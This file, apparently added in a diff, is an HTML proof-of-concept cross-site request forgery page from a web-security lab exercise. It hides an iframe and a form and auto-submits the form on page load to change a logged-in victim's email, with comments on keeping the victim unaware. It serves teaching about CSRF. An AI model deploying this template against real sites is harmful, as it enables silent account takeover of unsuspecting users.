@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <meta name="referrer" content="no-referrer">
+    
+    <!--content="no-referrer" will never pass any referral data from your site -->
+    <!--content="origin" will only send your site’s domain or subdomain, rather than the full URL-->
+    <!--content="unsafe-url" will always send the full URL of your referring page-->
+    
+    <title>CSRF</title>
+    
+    <style>
+        #csrf-main{
+        	   visibility: hidden;
+        	   }
+
+        /* change visibility="visible"  in order to see how the page would look like to victim if iframe and input tags are not kept hidden */
+        
+     </style>
+    
+</head>
+
+<body>
+    <h1>NEVER CLICK UNTRUSTED LINKS </h1>
+    
+    <main id="csrf-main">
+    
+    	<iframe name="csrf-iframe" ></iframe>
+    
+    	<form action="https://link-which-leads-to-change-in-email" method="post" target="csrf-iframe" id="csrf-form">
+    	
+            <!--action="https://subdomain.web-security-academy.net/my-account/change-email" -->
+            <!-- keeping target="csrf-iframe will lead to open the victims exploited page in iframe. As we have made iframe tag hidden so user will not know that he has been 
+    	    hacked"-->
+    	
+        	<input type="text" name='email' value="new@email">
+    	</form>
+    	
+    </main>
+    
+    <script>
+      document.forms[0].submit();
+    </script>
+    
+    <!--document.forms[0].submit() will trigger the submission of the first form in your HTML page. -->
+    
+    <!--  OR -->
+    
+    <!--script>document.getElementById("csrf-form").submit()</script-->
+    
+</body>
+</html>
